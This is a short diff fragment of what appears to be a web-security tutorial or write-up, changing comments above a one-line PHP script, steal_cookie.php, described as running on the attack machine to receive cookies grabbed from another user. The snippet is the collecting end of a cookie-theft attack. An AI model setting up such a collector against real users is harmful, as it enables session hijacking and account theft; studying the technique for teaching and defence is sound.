@@ -12,7 +12,9 @@ render_with_liquid: false
 ### 1. Create the payload for grabbing the Cookie when the other user will access your machine.
 
 ```php
-// steal_cookie.php
+// On attack machine
+// Create steal_cookie.php
+
 <?php echo $_GET['cookie']; ?>
 ```
 
